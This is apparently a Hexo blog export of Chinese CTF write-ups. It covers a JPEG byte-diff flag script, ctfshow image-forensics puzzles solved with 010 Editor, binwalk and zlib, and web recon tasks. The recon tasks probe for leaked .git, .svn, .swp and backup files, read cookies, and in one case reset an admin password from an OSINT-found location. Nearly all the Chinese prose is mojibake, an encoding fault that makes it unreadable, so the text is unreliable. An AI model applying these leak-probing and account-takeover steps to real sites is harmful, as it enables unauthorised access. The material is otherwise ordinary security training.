<p>çˆ†ç ´å‹ç¼©åŒ…â€“&gt;å¯†ç ä¸º 2611</p>
<p>æ‰“å¼€åå¾—åˆ°ä¸¤ä¸ªæœ‰éƒ¨åˆ†ä¸ä¸€æ ·jpgå›¾ç‰‡</p>
<p>pythonè§£å¯†è„šæœ¬ğŸ‘‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">open</span>(<span class="string">&#x27;panda1.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), <span class="built_in">open</span>(<span class="string">&#x27;panda.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) <span class="keyword">if</span> i!= j]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯»å–å›¾ç‰‡çš„å•ä¸ªå­—èŠ‚è¿›è¡Œæ¯”å¯¹ï¼Œä¸åŒçš„è¯è¾“å‡ºç›¸åº”çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------------</span></span><br><span class="line"><span class="comment">#csictf&#123;kung_fu_p4nd4&#125;</span></span><br></pre></td></tr></table></figure>

<p>æœ‰å…³çŸ¥è¯†ğŸ‘‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">join() æ–¹æ³•ç”¨äºå°†åºåˆ—ä¸­çš„å…ƒç´ ä»¥æŒ‡å®šçš„å­—ç¬¦è¿æ¥ç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="built_in">zip</span>() å‡½æ•°ç”¨äºå°†å¯è¿­ä»£çš„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå°†å¯¹è±¡ä¸­å¯¹åº”çš„å…ƒç´ æ‰“åŒ…æˆä¸€ä¸ªä¸ªå…ƒç»„ï¼Œç„¶åè¿”å›ç”±è¿™äº›å…ƒç»„ç»„æˆçš„åˆ—è¡¨</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶(ä¸€èˆ¬ä¸ºéæ–‡æœ¬)ç”¨äºåªè¯»</span><br><span class="line">read() æ–¹æ³•é»˜è®¤å‚æ•°ä¸º-<span class="number">1</span>ï¼Œå³è¯»å–æ•´ä¸ªæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">è„šæœ¬æ€è·¯ï¼šåˆ†åˆ«æ‰“å¼€panda1.jpg å’Œ panda.jpg è¯»å–æ¯ä¸ªå­—èŠ‚ï¼Œå¹¶å°†è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å­—èŠ‚æ•°æ®ä¾æ¬¡æ‰“åŒ…ä¸ºå…ƒç»„ï¼Œç”¨<span class="keyword">for</span>å¾ªç¯éå†å…ƒç»„ï¼Œå¯¹æ¯”å…ƒç»„ä¸­æ¯ä¸€ç»„çš„ä¸¤ä¸ªæ•°æ®æ˜¯å¦ç›¸åŒï¼Œä¸ç›¸åŒçš„è¯å°±è¿”å›å¯¹åº”çš„panda1.jpg ä¸­å¯¹åº”çš„å­—èŠ‚è½¬åŒ–ä¸ºå­—ç¬¦ç”¨join()æ–¹æ³•è¿æ¥æˆå­—ç¬¦ä¸²è¾“å‡º.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow_miscå…¥é—¨  WPï¼ˆæœªå®Œï¼‰</title>
    <url>/2021/05/11/ctfshow_misc_ru/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<h2 id="å›¾ç‰‡ç¯‡-åŸºç¡€æ“ä½œ"><a href="#å›¾ç‰‡ç¯‡-åŸºç¡€æ“ä½œ" class="headerlink" title="å›¾ç‰‡ç¯‡(åŸºç¡€æ“ä½œ)"></a>å›¾ç‰‡ç¯‡(åŸºç¡€æ“ä½œ)</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>æ²¡å•¥å¥½è¯´çš„ï¼Œæ‰“å¼€å›¾ç‰‡å°±æ˜¯flag</p>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>é™„ä»¶æ˜¯txtæ–‡æœ¬ï¼Œç”¨010editoræ‰“å¼€ï¼Œå‘ç°16è¿›åˆ¶å¯¹åº”çš„æ˜¯pngçš„æ–‡ä»¶å¤´ï¼Œä¿®æ”¹åç¼€åmisc2.txtâ€“&gt;misc.pngï¼Œæ‰“å¼€å›¾ç‰‡å°±å¯ä»¥çœ‹åˆ°flagäº†</p>
<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>è§£å‹åæ˜¯ä¸€ä¸ªbpgæ–‡ä»¶ï¼Œåœ¨<a href="https://bellard.org/bpg/">ç½‘ç«™</a>ä¸‹è½½bpgæ–‡ä»¶æŸ¥çœ‹å™¨ï¼Œè§£å‹åï¼Œç”¨bpgview.exeæ‰“å¼€misc3.bpgå³å¯çœ‹è§flag</p>
<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>ç»™äº†6ä¸ªtxtæ–‡ä»¶ï¼Œåˆ†åˆ«ç”¨010editoræ‰“å¼€ï¼Œçœ‹å¼€å¤´çš„16è¿›åˆ¶ï¼Œæ‰¾å¯¹åº”å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶å¤´ï¼Œä¾æ¬¡æ”¹ä¸ºpngã€jpgã€bmpã€gifã€tifã€webpä¹‹åå°†å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>æˆå“ï¼š<a href="https://pan.baidu.com/s/1Iz-HL2t5me3EfiZ2auGOFg">T0MR</a></p>
<h2 id="å›¾ç‰‡ç¯‡-ä¿¡æ¯é™„åŠ "><a href="#å›¾ç‰‡ç¯‡-ä¿¡æ¯é™„åŠ " class="headerlink" title="å›¾ç‰‡ç¯‡(ä¿¡æ¯é™„åŠ )"></a>å›¾ç‰‡ç¯‡(ä¿¡æ¯é™„åŠ )</h2><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>æ‰“å¼€é™„ä»¶ï¼Œå›¾ç‰‡ä¸Šå†™ç€<code>there_is_no_flag_here</code><del>è€Œä¸”å›¾ç‰‡ä¸º900x150åƒç´ ï¼Œå¾ˆæ˜æ˜¾å›¾ç‰‡çš„é«˜åº¦è¢«ç¼©å°äº†</del>ï¼ˆå½“æˆ‘ä¿®æ”¹å®Œé«˜åº¦ä¹‹åå‘ç°ï¼Œæˆ‘é”™äº†ï¼‰ç”¨010editoræ‰“å¼€ä¹‹åæ»‘åˆ°æœ€ä¸‹è¾¹å³å¯çœ‹åˆ°flag</p>
<h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>ç”¨010editoræ‰“å¼€æœç´¢æ–‡æœ¬ctfshowï¼Œå³å¯å‘ç°flagï¼ˆè¿™é¢˜æ˜¯è—åˆ°ä¸­é—´äº†</p>
<h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>é¢˜ç›®ä¸Šç»™äº†æç¤º<code>flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯ä¸­</code> <del>å¥½å˜›</del>ï¼Œè¿˜æ˜¯åœ¨010editorä¸­æœç´¢æ–‡æœ¬å°±å®Œäº‹ã€‚ã€‚</p>
<h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>é¢˜ç›®ç»™æç¤º<code>flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¸­å›¾ç‰‡æ–‡ä»¶ä¸­</code> é‚£å°±æ˜¯ä¸ªå¥—å¨ƒå‘—ï¼Œç”¨010editoræ‰“å¼€å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªpngæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼ŒæŠŠåè¾¹çš„pngæ–‡ä»¶åˆ†ç¦»å‡ºæ¥å°±å¯ä»¥äº†</p>
<p>æ–¹æ³•ï¼šæ‰¾åˆ°ç¬¬äºŒä¸ªpngæ–‡ä»¶å¤´<code>89 50 4E 47</code> å°†ä»è¿™å„¿å¼€å§‹ä¸€ç›´åˆ°ç»“å°¾çš„16è¿›åˆ¶æ–‡æœ¬å¤åˆ¶åˆ°ä¸€ä¸ªæ–°å»ºæ–‡æœ¬æ–‡æ¡£é‡Œè¾¹ï¼Œä¹‹ååœ¨010ä¸­ç‚¹å·¦ä¸Šè§’  æ–‡ä»¶â€“&gt;å¯¼å…¥16è¿›åˆ¶æ–‡æœ¬â€“&gt;é€‰ä¸­åˆšæ‰å¯¼å‡ºçš„æ–‡æœ¬â€“&gt;ä¿å­˜ä¸ºpngæ–‡ä»¶â€“&gt;å³å¯çœ‹åˆ°flagï¼ˆå¤åˆ¶16è¿›åˆ¶æ–‡æœ¬æ–¹æ³•ï¼šé€‰ä¸­ä¹‹åæ‰¾å·¦ä¸Šè§’çš„ç¼–è¾‘â€“&gt;å¤åˆ¶â€“&gt;å¤åˆ¶ä¸º16è¿›åˆ¶æ–‡æœ¬ï¼‰</p>
<h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><p>é¢˜ç›®ç»™çš„hint<code>flagåœ¨å›¾ç‰‡å—é‡Œ</code> ç›´æ¥010æ‰“å¼€ï¼Œæœç´¢ä¸€ä¸‹ctfshowå°±è¡Œã€‚</p>
<p>é¢„æœŸè§£åº”è¯¥æ˜¯ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/a1/c461bd18824075954430e81821aa105703e7fd.png" alt="misc9"></p>
<h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>é¢˜ç›®hint<code>flagåœ¨å›¾ç‰‡æ•°æ®é‡Œ</code> ç”¨kaliçš„binwalkåˆ†ç¦»å‡ºæ•°æ®ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e misc10.png</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/32/0bb40622510cc79d4473bc01cc97ac033e36d5.png" alt="misc10"></p>
<p>ç¬¬ä¸€ä¸ªæ–‡ä»¶æ‰“å¼€å°±çœ‹åˆ°äº†flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¯¹äºè¿™é¢˜å…«ç¥å¸ˆå‚…è¯´è¿‡ï¼š</span><br><span class="line">zlibæ˜¯PNG IDATå—æ•°æ®å¯é€‰çš„å‹ç¼©æ ¼å¼</span><br><span class="line">æœ¬é¢˜æ˜¯å¸ˆå‚…è‡ªå·±ç”Ÿæˆäº†ä¸€æ®µzlibå‹ç¼©æ•°æ®ï¼Œç„¶ååŠ ä¸Šé•¿åº¦ä½ã€æ ‡è¯†ä½å’ŒCRCæ ¡éªŒä½</span><br><span class="line">ä¼ªè£…æˆä¸€ä¸ªIDATå—ï¼Œç„¶åæ’å…¥åˆ°å›¾ç‰‡æ–‡ä»¶é‡Œ</span><br><span class="line">binwalkä¼šæ‰¾åˆ°zlibå—çš„æ ‡è®°ç„¶åæå–å‡ºæ¥ï¼ŒåŒæ—¶å› ä¸ºè¿™æ˜¯ä¸ªå‹ç¼©æ•°æ®ï¼Œ-eå‚æ•°ä¼šè‡ªåŠ¨æŠŠæå–åˆ°çš„å‹ç¼©åŒ…å°è¯•è¿›è¡Œè§£å‹ï¼Œæ‰€ä»¥æœ€åçš„æå–ç»“æœé‡Œå°±æœ‰äº†åŸå§‹çš„æ–‡æœ¬--&gt;flag</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥è§£å‹æœ€åä¸€ä¸ªidatå—å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;353252424ac69cb64f643768851ac790&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>hint<code>flagåœ¨å¦ä¸€å¼ å›¾é‡Œ</code> </p>
<p>è®²çœŸï¼Œè¿™ä¸ªhintæ²¡çœ‹æ‡‚ï¼Œåæ¥é—®äº†ä¸€ä¸‹å…«ç¥ğŸ‘´ğŸ‘´</p>
<p><img src="https://img.vim-cn.com/be/0560324992ad5c0a89854edd473ba53de933ea.png" alt="misc11.1"></p>
<p>ç”¨010æ‰“å¼€ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/8b/c96dec54ddad4bcf6d656f5aae09205d16234e.png" alt="misc11.2"></p>
<p>æŠŠç¬¬ä¸€ä¸ªIDATå¯¹åº”çš„éƒ¨åˆ†åˆ é™¤ä¹‹åä¿å­˜ä¸ºå¦ä¸€å¼ å›¾ç‰‡å³å¯çœ‹åˆ°flag</p>
<p>æˆ–è€…ç”¨tweakpngæ‰“å¼€é€‰ä¸­ç¬¬äºŒä¸ªidatå—ï¼Œå³é”®ç‚¹å‡»deleteåˆ é™¤ï¼Œç„¶åå¦å­˜ä¸ºä¸€å¼ å›¾ç‰‡å³å¯</p>
<p><img src="https://img.vim-cn.com/af/4b6d14360e50ee54755174587a61af4a51a314.png" alt="misc11.3"></p>
<h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow_webå…¥é—¨  WPï¼ˆæœªå®Œï¼‰</title>
    <url>/2021/05/12/ctfshow_web_ru/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>æ‰“å¼€æŒ‰f12 æˆ– å³é”®ç©ºç™½å¤„ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯åœ¨æ³¨é‡Šä¸­å‘ç°flag</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>é¢˜ç›®hintï¼š<code>jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</code></p>
<p>å‘ç°æ— æ³•ç”¨f12ä¹Ÿæ— æ³•ç”¨å³é”®æŸ¥çœ‹æºä»£ç </p>
<p>æ–¹æ³•1ã€åœ¨æµè§ˆå™¨çš„å·¥å…·é‡Œé€‰æ‹©å¼€å‘è€…å·¥å…·</p>
<p>æ–¹æ³•2ã€åœ¨urlå‰æ·»ä¸Š<code>view-source:</code></p>
<p>åœ¨æºä»£ç ä¸­å³å¯å‘ç°flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>é¢˜ç›®hintï¼š<code>æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</code></p>
<p>ç”¨burpsuiteæŠ“åŒ…ï¼Œå‘é€åˆ°repeateræ¨¡å—ï¼Œç‚¹å‡»sendçœ‹responseå³å¯å‘ç°flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>é¢˜ç›®hint:  <code>æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</code></p>
<p>æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šrobots.txt  <a href="https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fromtitle=robots.txt&fromid=9518761&fr=aladdin">æœ‰å…³çŸ¥è¯†</a></p>
<p>è®¿é—®url+/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;flagishere.txt</span><br></pre></td></tr></table></figure>

<p>æ¥ç€è®¿é—®url+/flagishere.txt å³å¯</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>é¢˜ç›®hintï¼š<code>phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</code></p>
<p>è®¿é—®url+/index.phps ä¸‹è½½æºç </p>
<p>ç”¨è®°äº‹æœ¬æ‰“å¼€å³å¯å‘ç°flag</p>
<p>ç›¸å…³çŸ¥è¯†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡Webæµè§ˆå™¨æŸ¥çœ‹phpä»£ç çš„å†…å®¹</span><br><span class="line">å› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨â€œçœ‹åˆ°â€phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>é¢˜ç›®hintï¼š<code>è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</code></p>
<p>è¿˜æ˜¯è€ƒå¯Ÿä»£ç æ³„éœ²ï¼Œè®¿é—®url+/<a href="http://www.zip/">www.zip</a> ä¸‹è½½æºç </p>
<p>æ‰“å¼€index.php æç¤ºflagåœ¨fl000g.txtä¸­ï¼Œå¯ä»¥çœ‹åˆ°å‹ç¼©åŒ…é‡Œæœ‰ä¸ªfl000g.txtï¼Œ<del>butè¿™ä¸ªæ˜¯ä¸ªå‡flag</del></p>
<p>è®¿é—®url+/fl000g.txtå³å¯æ‰¾åˆ°flag</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>é¢˜ç›®hintï¼š<code>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦</code></p>
<p>è€ƒå¯Ÿ.gitæºç æ³„éœ²</p>
<p>è®¿é—®url+/.git/å³å¯</p>
<p>.å¼€å¤´çš„æ–‡ä»¶å¤¹åœ¨linuxä¸‹æ˜¯éšè—æ–‡ä»¶ï¼Œåªæ˜¯åœ¨ç»ˆç«¯æ“ä½œçš„è¯çœ‹ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä¼šé”™è¯¯çš„å°†å…¶éƒ¨ç½²åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œé€ æˆäº†ä¿¡æ¯æ³„éœ²</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>hintä¸ä¸Šé¢˜ä¸€æ ·</p>
<p>è€ƒå¯Ÿ.svnä¿¡æ¯æ³„éœ²</p>
<p>è®¿é—®url+/.svn/å³å¯</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>é¢˜ç›®hintï¼š<code>å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</code></p>
<p>è€ƒå¯Ÿvimç¼“å­˜ä¿¡æ¯æ³„éœ²</p>
<p>linuxç³»ç»Ÿä¸‹ä½¿ç”¨vimç¼–è¾‘æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ï¼Œæ„å¤–é€€å‡ºçš„è¯è¿™ä¸ªæ–‡ä»¶ä¸ä¼šæ¶ˆå¤±ï¼Œç»“åˆé¢˜ç›®hintï¼Œ</p>
<p>è®¿é—®url+/index.php.swp ä¸‹è½½å¹¶æ‰“å¼€å³å¯æ‰¾åˆ°flag</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>é¢˜ç›®hintï¼š<code>cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</code></p>
<p>æ‰“å¼€æµè§ˆå™¨å¼€å‘äººå‘˜å·¥å…·(f12)ï¼Œåœ¨applicationä¸­æ‰¾åˆ°cookieï¼Œé‡Œè¾¹å°±æœ‰flag</p>
<p>ä»¥chromeä¸ºä¾‹ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/03/e60b27eb54d8ced045328cc1b35c3b99e68dec.png" alt="web10"></p>
<p>æˆ–è€…ç”¨burpsuiteæŠ“åŒ…ä¹Ÿå¯  è®°å¾—å°†%7B %7Dè½¬ä¸º{}</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>é¢˜ç›®hintï¼š<code>åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</code></p>
<p>ç”¨åŸŸåè§£ææŸ¥è¯¢<a href="http://dbcha.com/?t=1617279773">åœ¨çº¿ç½‘ç«™</a>è¾“å…¥ctfshow.com æŸ¥è¯¢txtå³å¯</p>
<p><img src="https://img.vim-cn.com/79/dd3c6ce0274d792fd6a9d9573bb83a295c26db.png" alt="web11"></p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>é¢˜ç›®hintï¼š<code>æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </code></p>
<p>çœ‹åˆ°é¡µé¢æœ€ä¸‹æ–¹æœ‰ä¸ªHelp Line Number : 372619038 çŒœæµ‹æ˜¯å¯†ç </p>
<p>è®¿é—®robots.txt å‘ç°ç”¨æˆ·åä¸ºadmin</p>
<p>è®¿é—®url+/admin/ä¼šæç¤ºä½ è¾“å…¥ç”¨æˆ·åå’Œå¯†ç </p>
<p>ç™»å½•åå‘ç°flag</p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>é¢˜ç›®hintï¼š<code>æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </code></p>
<p>æŠ€æœ¯æ–‡æ¡£ï¼Œæ–‡æ¡£çš„è‹±æ–‡æ˜¯documentï¼Œå¯ä»¥åœ¨productsé‡Œè¾¹çš„æœ€ä¸‹è¾¹å‘ç°æœ‰ä¸ªdocumentï¼Œæ‰“å¼€å¯ä»¥å‘ç°åå°åœ°å€ã€ç”¨æˆ·åå’Œå¯†ç ã€‚ç™»é™†è¿›å»å°±æœ‰flag</p>
<p>ï¼ˆåå°åœ°å€ä¸º  url+/system1103/login.php</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>é¢˜ç›®hintï¼š<code>æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</code></p>
<p>æ ¹æ®æç¤ºè®¿é—® url+/editor/</p>
<p><img src="https://img.vim-cn.com/14/a39cd61767361510e461a63f6d4618ed28922a.png" alt="web14.1"></p>
<p><img src="https://img.vim-cn.com/79/16002db4fcee3552c16ad9a2a751d507baed89.png" alt="web14.2"></p>
<p>åœ¨å›¾ç‰‡ç©ºé—´é‡Œæ‰¾åˆ°flagæ‰€åœ¨ä½ç½®ï¼ˆ/var/www/html/nothinghere/fl000g.txtï¼‰</p>
<p>ç›´æ¥è®¿é—®å³å¯ï¼ˆurl+/nothinghere/fl000g.txt</p>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>é¢˜ç›®hintï¼š<code>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</code></p>
<p>åœ¨é¡µé¢åº•éƒ¨å‘ç°qqé‚®ç®± <code>1156631961@qq.com</code></p>
<p>æ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°åå°ç•Œé¢ä¸º url+/admin/</p>
<p>ç‚¹å‡»å¿˜è®°å¯†ç  å‡ºç°å¯†ä¿é—®é¢˜<code>æˆ‘çš„æ‰€åœ¨åœ°æ˜¯å“ªä¸ªåŸå¸‚ï¼Ÿ</code></p>
<p>qqæœç´¢åˆšåˆšé‚£ä¸ªqqå· å‘ç°æ‰€åœ¨åœ°ä¸º è¥¿å®‰</p>
<p>è¾“å…¥å æç¤º <code>æ‚¨çš„å¯†ç å·²é‡ç½®ä¸ºadmin7789</code></p>
<p>è¿”å›ç™»é™†ç•Œé¢ ç”¨æˆ·åadmin å¯†ç  admin7789</p>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>é¢˜ç›®hintï¼š<code>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</code></p>
<p>hinté‡Œæåˆ°äº†æ¢é’ˆï¼Œé‚£å°±è®¿é—®url+/tz.php</p>
<p>æŸ¥çœ‹phpinfoï¼Œæœç´¢ctfshowå³å¯çœ‹åˆ°flag</p>
<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>é¢˜ç›®hintï¼š<code>é€è¿‡é‡é‡ç¼“å­˜ï¼ŒæŸ¥æ‰¾åˆ°ctfer.comçš„çœŸå®IPï¼Œæäº¤ flag&#123;IPåœ°å€&#125; </code></p>
<p>ç™¾åº¦æœç´¢fofa</p>
<p>æœç´¢æ è¾“å…¥ctfer.com å¯ä»¥çœ‹åˆ°<a href="http://www.ctfer.comçš„ipåœ°å€/">www.ctfer.comçš„ipåœ°å€</a> <code>111.231.70.44</code></p>
<p>æŒ‰ç…§è¦æ±‚æäº¤å³å¯</p>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>é¢˜ç›®hintï¼š<code>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</code></p>
<p>æ‰“å¼€æ˜¯ä¸ªflybirdçš„å°æ¸¸æˆ</p>
<p>åœ¨Flappy_js.jsä¸­çš„åˆ¤æ–­éƒ¨åˆ†å‘ç°ä¸€ä¸²Unicodeç¼–ç ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/9d/946c0c1a88edba41e5d5b7cccff2fe02973b44.png" alt="web18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><br></pre></td></tr></table></figure>

<p>è§£ç åä¸ºğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹</span><br><span class="line">å»110.phpçœ‹çœ‹</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—®url+/110.php å³å¯å‘ç°flag</p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>é¢˜ç›®hintï¼š<code>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</code></p>
<p>æŸ¥çœ‹æºç å‘ç°æ³¨é‡ŠğŸ‘‡</p>
